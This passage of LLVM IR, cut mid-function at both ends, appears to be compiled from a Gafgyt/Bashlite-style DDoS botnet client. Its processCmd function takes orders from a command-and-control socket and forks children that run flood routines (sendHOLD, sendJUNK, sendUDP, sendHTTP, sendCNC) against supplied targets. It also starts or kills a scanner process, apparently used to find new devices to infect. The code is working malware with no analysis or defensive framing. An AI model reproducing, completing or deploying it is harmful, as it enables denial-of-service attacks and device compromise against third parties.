  %181 = load i32, i32* %8, align 4
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %41, i64 %182
  %184 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %183, i32 0, i32 1
  store i8 2, i8* %184, align 4
  br label %185

185:                                              ; preds = %180, %169
  br label %201

186:                                              ; preds = %128
  %187 = load i32, i32* %16, align 4
  %188 = icmp eq i32 %187, -1
  br i1 %188, label %189, label %200

189:                                              ; preds = %186
  %190 = load i32, i32* %8, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %41, i64 %191
  %193 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %192, i32 0, i32 0
  %194 = load i32, i32* %193, align 8
  %195 = call i32 @close(i32 %194)
  %196 = load i32, i32* %8, align 4
  %197 = sext i32 %196 to i64
  %198 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %41, i64 %197
  %199 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %198, i32 0, i32 1
  store i8 0, i8* %199, align 4
  br label %200

200:                                              ; preds = %189, %186
  br label %201

201:                                              ; preds = %200, %185
  br label %262

202:                                              ; preds = %60
  br label %203

203:                                              ; preds = %202
  store %struct.fd_set* %12, %struct.fd_set** %22, align 8
  store i32 0, i32* %21, align 4
  br label %204

204:                                              ; preds = %214, %203
  %205 = load i32, i32* %21, align 4
  %206 = zext i32 %205 to i64
  %207 = icmp ult i64 %206, 16
  br i1 %207, label %208, label %217

208:                                              ; preds = %204
  %209 = load %struct.fd_set*, %struct.fd_set** %22, align 8
  %210 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %209, i32 0, i32 0
  %211 = load i32, i32* %21, align 4
  %212 = zext i32 %211 to i64
  %213 = getelementptr inbounds [16 x i64], [16 x i64]* %210, i64 0, i64 %212
  store i64 0, i64* %213, align 8
  br label %214

214:                                              ; preds = %208
  %215 = load i32, i32* %21, align 4
  %216 = add i32 %215, 1
  store i32 %216, i32* %21, align 4
  br label %204, !llvm.loop !48

217:                                              ; preds = %204
  br label %218

218:                                              ; preds = %217
  br label %219

219:                                              ; preds = %218
  %220 = load i32, i32* %8, align 4
  %221 = sext i32 %220 to i64
  %222 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %41, i64 %221
  %223 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %222, i32 0, i32 0
  %224 = load i32, i32* %223, align 8
  %225 = srem i32 %224, 64
  %226 = zext i32 %225 to i64
  %227 = shl i64 1, %226
  %228 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %229 = load i32, i32* %8, align 4
  %230 = sext i32 %229 to i64
  %231 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %41, i64 %230
  %232 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %231, i32 0, i32 0
  %233 = load i32, i32* %232, align 8
  %234 = sdiv i32 %233, 64
  %235 = sext i32 %234 to i64
  %236 = getelementptr inbounds [16 x i64], [16 x i64]* %228, i64 0, i64 %235
  %237 = load i64, i64* %236, align 8
  %238 = or i64 %237, %227
  store i64 %238, i64* %236, align 8
  %239 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %239, align 8
  %240 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 10000, i64* %240, align 8
  %241 = load i32, i32* %8, align 4
  %242 = sext i32 %241 to i64
  %243 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %41, i64 %242
  %244 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %243, i32 0, i32 0
  %245 = load i32, i32* %244, align 8
  %246 = add nsw i32 %245, 1
  %247 = call i32 @select(i32 %246, %struct.fd_set* null, %struct.fd_set* null, %struct.fd_set* %12, %struct.timeval* %13)
  store i32 %247, i32* %16, align 4
  %248 = load i32, i32* %16, align 4
  %249 = icmp ne i32 %248, 0
  br i1 %249, label %250, label %261

250:                                              ; preds = %219
  %251 = load i32, i32* %8, align 4
  %252 = sext i32 %251 to i64
  %253 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %41, i64 %252
  %254 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %253, i32 0, i32 0
  %255 = load i32, i32* %254, align 8
  %256 = call i32 @close(i32 %255)
  %257 = load i32, i32* %8, align 4
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %41, i64 %258
  %260 = getelementptr inbounds %struct.state_t.4, %struct.state_t.4* %259, i32 0, i32 1
  store i8 0, i8* %260, align 4
  br label %261

261:                                              ; preds = %250, %219
  br label %262

262:                                              ; preds = %60, %261, %201, %110
  br label %263

263:                                              ; preds = %262
  %264 = load i32, i32* %8, align 4
  %265 = add nsw i32 %264, 1
  store i32 %265, i32* %8, align 4
  br label %56, !llvm.loop !49

266:                                              ; preds = %56
  br label %51, !llvm.loop !50

267:                                              ; preds = %51
  %268 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %268)
  br label %269

269:                                              ; preds = %267, %34
  ret void
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @processCmd(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i8*, align 8
  %34 = alloca i32, align 4
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = alloca i8*, align 8
  %38 = alloca i32, align 4
  %39 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %40 = load i8**, i8*** %4, align 8
  %41 = getelementptr inbounds i8*, i8** %40, i64 0
  %42 = load i8*, i8** %41, align 8
  %43 = call i32 @strcmp(i8* %42, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.71, i64 0, i64 0)) #11
  %44 = icmp ne i32 %43, 0
  br i1 %44, label %48, label %45

45:                                               ; preds = %2
  %46 = load i32, i32* @mainCommSock, align 4
  %47 = call i32 (i32, i8*, ...) @sockprintf(i32 %46, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.90, i64 0, i64 0))
  br label %693

48:                                               ; preds = %2
  %49 = load i8**, i8*** %4, align 8
  %50 = getelementptr inbounds i8*, i8** %49, i64 0
  %51 = load i8*, i8** %50, align 8
  %52 = call i32 @strcmp(i8* %51, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.91, i64 0, i64 0)) #11
  %53 = icmp ne i32 %52, 0
  br i1 %53, label %59, label %54

54:                                               ; preds = %48
  %55 = load i32, i32* @mainCommSock, align 4
  %56 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %57 = call i8* @inet_ntoa(i32 %56) #12
  %58 = call i32 (i32, i8*, ...) @sockprintf(i32 %55, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.92, i64 0, i64 0), i8* %57)
  br label %693

59:                                               ; preds = %48
  %60 = load i8**, i8*** %4, align 8
  %61 = getelementptr inbounds i8*, i8** %60, i64 0
  %62 = load i8*, i8** %61, align 8
  %63 = call i32 @strcmp(i8* %62, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.93, i64 0, i64 0)) #11
  %64 = icmp ne i32 %63, 0
  br i1 %64, label %111, label %65

65:                                               ; preds = %59
  %66 = load i32, i32* %3, align 4
  %67 = icmp ne i32 %66, 2
  br i1 %67, label %68, label %71

68:                                               ; preds = %65
  %69 = load i32, i32* @mainCommSock, align 4
  %70 = call i32 (i32, i8*, ...) @sockprintf(i32 %69, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.94, i64 0, i64 0))
  br label %693

71:                                               ; preds = %65
  %72 = load i8**, i8*** %4, align 8
  %73 = getelementptr inbounds i8*, i8** %72, i64 1
  %74 = load i8*, i8** %73, align 8
  %75 = call i32 @strcmp(i8* %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.95, i64 0, i64 0)) #11
  %76 = icmp ne i32 %75, 0
  br i1 %76, label %86, label %77

77:                                               ; preds = %71
  %78 = load i32, i32* @scanPid, align 4
  %79 = icmp eq i32 %78, 0
  br i1 %79, label %80, label %81

80:                                               ; preds = %77
  br label %693

81:                                               ; preds = %77
  %82 = load i32, i32* @scanPid, align 4
  %83 = call i32 @kill(i32 %82, i32 9) #12
  %84 = load i32, i32* @mainCommSock, align 4
  %85 = call i32 (i32, i8*, ...) @sockprintf(i32 %84, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.96, i64 0, i64 0))
  store i32 0, i32* @scanPid, align 4
  br label %86

86:                                               ; preds = %81, %71
  %87 = load i8**, i8*** %4, align 8
  %88 = getelementptr inbounds i8*, i8** %87, i64 1
  %89 = load i8*, i8** %88, align 8
  %90 = call i32 @strcmp(i8* %89, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.97, i64 0, i64 0)) #11
  %91 = icmp ne i32 %90, 0
  br i1 %91, label %110, label %92

92:                                               ; preds = %86
  %93 = load i32, i32* @scanPid, align 4
  %94 = icmp ne i32 %93, 0
  br i1 %94, label %95, label %96

95:                                               ; preds = %92
  br label %693

96:                                               ; preds = %92
  %97 = call i32 @fork() #12
  store i32 %97, i32* %6, align 4
  %98 = load i32, i32* %6, align 4
  %99 = icmp ugt i32 %98, 0
  br i1 %99, label %100, label %102

100:                                              ; preds = %96
  %101 = load i32, i32* %6, align 4
  store i32 %101, i32* @scanPid, align 4
  br label %693

102:                                              ; preds = %96
  %103 = load i32, i32* %6, align 4
  %104 = icmp eq i32 %103, -1
  br i1 %104, label %105, label %106

105:                                              ; preds = %102
  br label %693

106:                                              ; preds = %102
  br label %107

107:                                              ; preds = %106
  %108 = load i32, i32* @mainCommSock, align 4
  %109 = call i32 (i32, i8*, ...) @sockprintf(i32 %108, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.98, i64 0, i64 0))
  call void @StartTheLelz()
  call void @_exit(i32 0) #14
  unreachable

110:                                              ; preds = %86
  br label %111

111:                                              ; preds = %110, %59
  %112 = load i8**, i8*** %4, align 8
  %113 = getelementptr inbounds i8*, i8** %112, i64 0
  %114 = load i8*, i8** %113, align 8
  %115 = call i32 @strcmp(i8* %114, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.99, i64 0, i64 0)) #11
  %116 = icmp ne i32 %115, 0
  br i1 %116, label %173, label %117

117:                                              ; preds = %111
  %118 = load i32, i32* %3, align 4
  %119 = icmp slt i32 %118, 4
  br i1 %119, label %132, label %120

120:                                              ; preds = %117
  %121 = load i8**, i8*** %4, align 8
  %122 = getelementptr inbounds i8*, i8** %121, i64 2
  %123 = load i8*, i8** %122, align 8
  %124 = call i32 @atoi(i8* %123) #11
  %125 = icmp slt i32 %124, 1
  br i1 %125, label %132, label %126

126:                                              ; preds = %120
  %127 = load i8**, i8*** %4, align 8
  %128 = getelementptr inbounds i8*, i8** %127, i64 3
  %129 = load i8*, i8** %128, align 8
  %130 = call i32 @atoi(i8* %129) #11
  %131 = icmp slt i32 %130, 1
  br i1 %131, label %132, label %133

132:                                              ; preds = %126, %120, %117
  br label %693

133:                                              ; preds = %126
  %134 = load i8**, i8*** %4, align 8
  %135 = getelementptr inbounds i8*, i8** %134, i64 1
  %136 = load i8*, i8** %135, align 8
  store i8* %136, i8** %7, align 8
  %137 = load i8**, i8*** %4, align 8
  %138 = getelementptr inbounds i8*, i8** %137, i64 2
  %139 = load i8*, i8** %138, align 8
  %140 = call i32 @atoi(i8* %139) #11
  store i32 %140, i32* %8, align 4
  %141 = load i8**, i8*** %4, align 8
  %142 = getelementptr inbounds i8*, i8** %141, i64 3
  %143 = load i8*, i8** %142, align 8
  %144 = call i32 @atoi(i8* %143) #11
  store i32 %144, i32* %9, align 4
  %145 = load i8*, i8** %7, align 8
  %146 = call i8* @strstr(i8* %145, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i64 0, i64 0)) #11
  %147 = icmp ne i8* %146, null
  br i1 %147, label %148, label %164

148:                                              ; preds = %133
  %149 = load i8*, i8** %7, align 8
  %150 = call i8* @strtok(i8* %149, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i64 0, i64 0)) #12
  store i8* %150, i8** %10, align 8
  br label %151

151:                                              ; preds = %161, %148
  %152 = load i8*, i8** %10, align 8
  %153 = icmp ne i8* %152, null
  br i1 %153, label %154, label %163

154:                                              ; preds = %151
  %155 = call i32 @listFork()
  %156 = icmp ne i32 %155, 0
  br i1 %156, label %161, label %157

157:                                              ; preds = %154
  %158 = load i8*, i8** %10, align 8
  %159 = load i32, i32* %8, align 4
  %160 = load i32, i32* %9, align 4
  call void @sendHOLD(i8* %158, i32 %159, i32 %160)
  call void @_exit(i32 0) #14
  unreachable

161:                                              ; preds = %154
  %162 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i64 0, i64 0)) #12
  store i8* %162, i8** %10, align 8
  br label %151, !llvm.loop !51

163:                                              ; preds = %151
  br label %172

164:                                              ; preds = %133
  %165 = call i32 @listFork()
  %166 = icmp ne i32 %165, 0
  br i1 %166, label %167, label %168

167:                                              ; preds = %164
  br label %693

168:                                              ; preds = %164
  %169 = load i8*, i8** %7, align 8
  %170 = load i32, i32* %8, align 4
  %171 = load i32, i32* %9, align 4
  call void @sendHOLD(i8* %169, i32 %170, i32 %171)
  call void @_exit(i32 0) #14
  unreachable

172:                                              ; preds = %163
  br label %173

173:                                              ; preds = %172, %111
  %174 = load i8**, i8*** %4, align 8
  %175 = getelementptr inbounds i8*, i8** %174, i64 0
  %176 = load i8*, i8** %175, align 8
  %177 = call i32 @strcmp(i8* %176, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.100, i64 0, i64 0)) #11
  %178 = icmp ne i32 %177, 0
  br i1 %178, label %237, label %179

179:                                              ; preds = %173
  %180 = load i32, i32* %3, align 4
  %181 = icmp slt i32 %180, 4
  br i1 %181, label %194, label %182

182:                                              ; preds = %179
  %183 = load i8**, i8*** %4, align 8
  %184 = getelementptr inbounds i8*, i8** %183, i64 2
  %185 = load i8*, i8** %184, align 8
  %186 = call i32 @atoi(i8* %185) #11
  %187 = icmp slt i32 %186, 1
  br i1 %187, label %194, label %188

188:                                              ; preds = %182
  %189 = load i8**, i8*** %4, align 8
  %190 = getelementptr inbounds i8*, i8** %189, i64 3
  %191 = load i8*, i8** %190, align 8
  %192 = call i32 @atoi(i8* %191) #11
  %193 = icmp slt i32 %192, 1
  br i1 %193, label %194, label %195

194:                                              ; preds = %188, %182, %179
  br label %693

195:                                              ; preds = %188
  %196 = load i8**, i8*** %4, align 8
  %197 = getelementptr inbounds i8*, i8** %196, i64 1
  %198 = load i8*, i8** %197, align 8
  store i8* %198, i8** %11, align 8
  %199 = load i8**, i8*** %4, align 8
  %200 = getelementptr inbounds i8*, i8** %199, i64 2
  %201 = load i8*, i8** %200, align 8
  %202 = call i32 @atoi(i8* %201) #11
  store i32 %202, i32* %12, align 4
  %203 = load i8**, i8*** %4, align 8
  %204 = getelementptr inbounds i8*, i8** %203, i64 3
  %205 = load i8*, i8** %204, align 8
  %206 = call i32 @atoi(i8* %205) #11
  store i32 %206, i32* %13, align 4
  %207 = load i8*, i8** %11, align 8
  %208 = call i8* @strstr(i8* %207, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i64 0, i64 0)) #11
  %209 = icmp ne i8* %208, null
  br i1 %209, label %210, label %228

210:                                              ; preds = %195
  %211 = load i8*, i8** %11, align 8
  %212 = call i8* @strtok(i8* %211, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i64 0, i64 0)) #12
  store i8* %212, i8** %14, align 8
  br label %213

213:                                              ; preds = %225, %210
  %214 = load i8*, i8** %14, align 8
  %215 = icmp ne i8* %214, null
  br i1 %215, label %216, label %227

216:                                              ; preds = %213
  %217 = call i32 @listFork()
  %218 = icmp ne i32 %217, 0
  br i1 %218, label %225, label %219

219:                                              ; preds = %216
  %220 = load i8*, i8** %14, align 8
  %221 = load i32, i32* %12, align 4
  %222 = load i32, i32* %13, align 4
  call void @sendJUNK(i8* %220, i32 %221, i32 %222)
  %223 = load i32, i32* @mainCommSock, align 4
  %224 = call i32 @close(i32 %223)
  call void @_exit(i32 0) #14
  unreachable

225:                                              ; preds = %216
  %226 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i64 0, i64 0)) #12
  store i8* %226, i8** %14, align 8
  br label %213, !llvm.loop !52

227:                                              ; preds = %213
  br label %236

228:                                              ; preds = %195
  %229 = call i32 @listFork()
  %230 = icmp ne i32 %229, 0
  br i1 %230, label %231, label %232

231:                                              ; preds = %228
  br label %693

232:                                              ; preds = %228
  %233 = load i8*, i8** %11, align 8
  %234 = load i32, i32* %12, align 4
  %235 = load i32, i32* %13, align 4
  call void @sendJUNK(i8* %233, i32 %234, i32 %235)
  call void @_exit(i32 0) #14
  unreachable

236:                                              ; preds = %227
  br label %237

237:                                              ; preds = %236, %173
  %238 = load i8**, i8*** %4, align 8
  %239 = getelementptr inbounds i8*, i8** %238, i64 0
  %240 = load i8*, i8** %239, align 8
  %241 = call i32 @strcmp(i8* %240, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.101, i64 0, i64 0)) #11
  %242 = icmp ne i32 %241, 0
  br i1 %242, label %340, label %243

243:                                              ; preds = %237
  %244 = load i32, i32* %3, align 4
  %245 = icmp slt i32 %244, 6
  br i1 %245, label %279, label %246

246:                                              ; preds = %243
  %247 = load i8**, i8*** %4, align 8
  %248 = getelementptr inbounds i8*, i8** %247, i64 3
  %249 = load i8*, i8** %248, align 8
  %250 = call i32 @atoi(i8* %249) #11
  %251 = icmp eq i32 %250, -1
  br i1 %251, label %279, label %252

252:                                              ; preds = %246
  %253 = load i8**, i8*** %4, align 8
  %254 = getelementptr inbounds i8*, i8** %253, i64 2
  %255 = load i8*, i8** %254, align 8
  %256 = call i32 @atoi(i8* %255) #11
  %257 = icmp eq i32 %256, -1
  br i1 %257, label %279, label %258

258:                                              ; preds = %252
  %259 = load i8**, i8*** %4, align 8
  %260 = getelementptr inbounds i8*, i8** %259, i64 4
  %261 = load i8*, i8** %260, align 8
  %262 = call i32 @atoi(i8* %261) #11
  %263 = icmp eq i32 %262, -1
  br i1 %263, label %279, label %264

264:                                              ; preds = %258
  %265 = load i8**, i8*** %4, align 8
  %266 = getelementptr inbounds i8*, i8** %265, i64 4
  %267 = load i8*, i8** %266, align 8
  %268 = call i32 @atoi(i8* %267) #11
  %269 = icmp sgt i32 %268, 1024
  br i1 %269, label %279, label %270

270:                                              ; preds = %264
  %271 = load i32, i32* %3, align 4
  %272 = icmp eq i32 %271, 6
  br i1 %272, label %273, label %280

273:                                              ; preds = %270
  %274 = load i8**, i8*** %4, align 8
  %275 = getelementptr inbounds i8*, i8** %274, i64 5
  %276 = load i8*, i8** %275, align 8
  %277 = call i32 @atoi(i8* %276) #11
  %278 = icmp slt i32 %277, 1
  br i1 %278, label %279, label %280

279:                                              ; preds = %273, %264, %258, %252, %246, %243
  br label %693

280:                                              ; preds = %273, %270
  %281 = load i8**, i8*** %4, align 8
  %282 = getelementptr inbounds i8*, i8** %281, i64 1
  %283 = load i8*, i8** %282, align 8
  store i8* %283, i8** %15, align 8
  %284 = load i8**, i8*** %4, align 8
  %285 = getelementptr inbounds i8*, i8** %284, i64 2
  %286 = load i8*, i8** %285, align 8
  %287 = call i32 @atoi(i8* %286) #11
  store i32 %287, i32* %16, align 4
  %288 = load i8**, i8*** %4, align 8
  %289 = getelementptr inbounds i8*, i8** %288, i64 3
  %290 = load i8*, i8** %289, align 8
  %291 = call i32 @atoi(i8* %290) #11
  store i32 %291, i32* %17, align 4
  %292 = load i8**, i8*** %4, align 8
  %293 = getelementptr inbounds i8*, i8** %292, i64 4
  %294 = load i8*, i8** %293, align 8
  %295 = call i32 @atoi(i8* %294) #11
  store i32 %295, i32* %18, align 4
  %296 = load i32, i32* %3, align 4
  %297 = icmp eq i32 %296, 6
  br i1 %297, label %298, label %303

298:                                              ; preds = %280
  %299 = load i8**, i8*** %4, align 8
  %300 = getelementptr inbounds i8*, i8** %299, i64 5
  %301 = load i8*, i8** %300, align 8
  %302 = call i32 @atoi(i8* %301) #11
  br label %304

303:                                              ; preds = %280
  br label %304

304:                                              ; preds = %303, %298
  %305 = phi i32 [ %302, %298 ], [ 10, %303 ]
  store i32 %305, i32* %19, align 4
  store i32 32, i32* %20, align 4
  %306 = load i8*, i8** %15, align 8
  %307 = call i8* @strstr(i8* %306, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i64 0, i64 0)) #11
  %308 = icmp ne i8* %307, null
  br i1 %308, label %309, label %328

309:                                              ; preds = %304
  %310 = load i8*, i8** %15, align 8
  %311 = call i8* @strtok(i8* %310, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i64 0, i64 0)) #12
  store i8* %311, i8** %21, align 8
  br label %312

312:                                              ; preds = %325, %309
  %313 = load i8*, i8** %21, align 8
  %314 = icmp ne i8* %313, null
  br i1 %314, label %315, label %327

315:                                              ; preds = %312
  %316 = call i32 @listFork()
  %317 = icmp ne i32 %316, 0
  br i1 %317, label %325, label %318

318:                                              ; preds = %315
  %319 = load i8*, i8** %21, align 8
  %320 = load i32, i32* %16, align 4
  %321 = load i32, i32* %17, align 4
  %322 = load i32, i32* %18, align 4
  %323 = load i32, i32* %19, align 4
  %324 = load i32, i32* %20, align 4
  call void @sendUDP(i8* %319, i32 %320, i32 %321, i32 %322, i32 %323, i32 %324)
  call void @_exit(i32 0) #14
  unreachable

325:                                              ; preds = %315
  %326 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i64 0, i64 0)) #12
  store i8* %326, i8** %21, align 8
  br label %312, !llvm.loop !53

327:                                              ; preds = %312
  br label %339

328:                                              ; preds = %304
  %329 = call i32 @listFork()
  %330 = icmp ne i32 %329, 0
  br i1 %330, label %331, label %332

331:                                              ; preds = %328
  br label %693

332:                                              ; preds = %328
  %333 = load i8*, i8** %15, align 8
  %334 = load i32, i32* %16, align 4
  %335 = load i32, i32* %17, align 4
  %336 = load i32, i32* %18, align 4
  %337 = load i32, i32* %19, align 4
  %338 = load i32, i32* %20, align 4
  call void @sendUDP(i8* %333, i32 %334, i32 %335, i32 %336, i32 %337, i32 %338)
  call void @_exit(i32 0) #14
  unreachable

339:                                              ; preds = %327
  br label %340

340:                                              ; preds = %339, %237
  %341 = load i8**, i8*** %4, align 8
  %342 = getelementptr inbounds i8*, i8** %341, i64 0
  %343 = load i8*, i8** %342, align 8
  %344 = call i32 @strcmp(i8* %343, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.102, i64 0, i64 0)) #11
  %345 = icmp ne i32 %344, 0
  br i1 %345, label %389, label %346

346:                                              ; preds = %340
  %347 = load i32, i32* %3, align 4
  %348 = icmp slt i32 %347, 6
  br i1 %348, label %361, label %349

349:                                              ; preds = %346
  %350 = load i8**, i8*** %4, align 8
  %351 = getelementptr inbounds i8*, i8** %350, i64 3
  %352 = load i8*, i8** %351, align 8
  %353 = call i32 @atoi(i8* %352) #11
  %354 = icmp slt i32 %353, 1
  br i1 %354, label %361, label %355

355:                                              ; preds = %349
  %356 = load i8**, i8*** %4, align 8
  %357 = getelementptr inbounds i8*, i8** %356, i64 5
  %358 = load i8*, i8** %357, align 8
  %359 = call i32 @atoi(i8* %358) #11
  %360 = icmp slt i32 %359, 1
  br i1 %360, label %361, label %362

361:                                              ; preds = %355, %349, %346
  br label %693

362:                                              ; preds = %355
  %363 = call i32 @listFork()
  %364 = icmp ne i32 %363, 0
  br i1 %364, label %365, label %366

365:                                              ; preds = %362
  br label %693

366:                                              ; preds = %362
  %367 = load i8**, i8*** %4, align 8
  %368 = getelementptr inbounds i8*, i8** %367, i64 1
  %369 = load i8*, i8** %368, align 8
  %370 = load i8**, i8*** %4, align 8
  %371 = getelementptr inbounds i8*, i8** %370, i64 2
  %372 = load i8*, i8** %371, align 8
  %373 = load i8**, i8*** %4, align 8
  %374 = getelementptr inbounds i8*, i8** %373, i64 3
  %375 = load i8*, i8** %374, align 8
  %376 = call i32 @atoi(i8* %375) #11
  %377 = trunc i32 %376 to i16
  %378 = load i8**, i8*** %4, align 8
  %379 = getelementptr inbounds i8*, i8** %378, i64 4
  %380 = load i8*, i8** %379, align 8
  %381 = load i8**, i8*** %4, align 8
  %382 = getelementptr inbounds i8*, i8** %381, i64 5
  %383 = load i8*, i8** %382, align 8
  %384 = call i32 @atoi(i8* %383) #11
  %385 = load i8**, i8*** %4, align 8
  %386 = getelementptr inbounds i8*, i8** %385, i64 6
  %387 = load i8*, i8** %386, align 8
  %388 = call i32 @atoi(i8* %387) #11
  call void @sendHTTP(i8* %369, i8* %372, i16 zeroext %377, i8* %380, i32 %384, i32 %388)
  call void @exit(i32 0) #16
  unreachable

389:                                              ; preds = %340
  %390 = load i8**, i8*** %4, align 8
  %391 = getelementptr inbounds i8*, i8** %390, i64 0
  %392 = load i8*, i8** %391, align 8
  %393 = call i32 @strcmp(i8* %392, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.103, i64 0, i64 0)) #11
  %394 = icmp ne i32 %393, 0
  br i1 %394, label %453, label %395

395:                                              ; preds = %389
  %396 = load i32, i32* %3, align 4
  %397 = icmp slt i32 %396, 4
  br i1 %397, label %410, label %398

398:                                              ; preds = %395
  %399 = load i8**, i8*** %4, align 8
  %400 = getelementptr inbounds i8*, i8** %399, i64 2
  %401 = load i8*, i8** %400, align 8
  %402 = call i32 @atoi(i8* %401) #11
  %403 = icmp slt i32 %402, 1
  br i1 %403, label %410, label %404

404:                                              ; preds = %398
  %405 = load i8**, i8*** %4, align 8
  %406 = getelementptr inbounds i8*, i8** %405, i64 3
  %407 = load i8*, i8** %406, align 8
  %408 = call i32 @atoi(i8* %407) #11
  %409 = icmp slt i32 %408, 1
  br i1 %409, label %410, label %411

410:                                              ; preds = %404, %398, %395
  br label %693

411:                                              ; preds = %404
  %412 = load i8**, i8*** %4, align 8
  %413 = getelementptr inbounds i8*, i8** %412, i64 1
  %414 = load i8*, i8** %413, align 8
  store i8* %414, i8** %22, align 8
  %415 = load i8**, i8*** %4, align 8
  %416 = getelementptr inbounds i8*, i8** %415, i64 2
  %417 = load i8*, i8** %416, align 8
  %418 = call i32 @atoi(i8* %417) #11
  store i32 %418, i32* %23, align 4
  %419 = load i8**, i8*** %4, align 8
  %420 = getelementptr inbounds i8*, i8** %419, i64 3
  %421 = load i8*, i8** %420, align 8
  %422 = call i32 @atoi(i8* %421) #11
  store i32 %422, i32* %24, align 4
  %423 = load i8*, i8** %22, align 8
  %424 = call i8* @strstr(i8* %423, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i64 0, i64 0)) #11
  %425 = icmp ne i8* %424, null
  br i1 %425, label %426, label %444

426:                                              ; preds = %411
  %427 = load i8*, i8** %22, align 8
  %428 = call i8* @strtok(i8* %427, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i64 0, i64 0)) #12
  store i8* %428, i8** %25, align 8
  br label %429

429:                                              ; preds = %441, %426
  %430 = load i8*, i8** %25, align 8
  %431 = icmp ne i8* %430, null
  br i1 %431, label %432, label %443

432:                                              ; preds = %429
  %433 = call i32 @listFork()
  %434 = icmp ne i32 %433, 0
  br i1 %434, label %441, label %435

435:                                              ; preds = %432
  %436 = load i8*, i8** %25, align 8
  %437 = load i32, i32* %23, align 4
  %438 = load i32, i32* %24, align 4
  call void @sendCNC(i8* %436, i32 %437, i32 %438)
  %439 = load i32, i32* @mainCommSock, align 4
  %440 = call i32 @close(i32 %439)
  call void @_exit(i32 0) #14
  unreachable

441:                                              ; preds = %432
  %442 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i64 0, i64 0)) #12
  store i8* %442, i8** %25, align 8
  br label %429, !llvm.loop !54

443:                                              ; preds = %429
  br label %452

444:                                              ; preds = %411
  %445 = call i32 @listFork()
  %446 = icmp ne i32 %445, 0
  br i1 %446, label %447, label %448

447:                                              ; preds = %444
  br label %693

448:                                              ; preds = %444
  %449 = load i8*, i8** %22, align 8
  %450 = load i32, i32* %23, align 4
  %451 = load i32, i32* %24, align 4
  call void @sendCNC(i8* %449, i32 %450, i32 %451)
  call void @_exit(i32 0) #14
  unreachable

452:                                              ; preds = %443
  br label %453

453:                                              ; preds = %452, %389
  %454 = load i8**, i8*** %4, align 8
  %455 = getelementptr inbounds i8*, i8** %454, i64 0
  %456 = load i8*, i8** %455, align 8
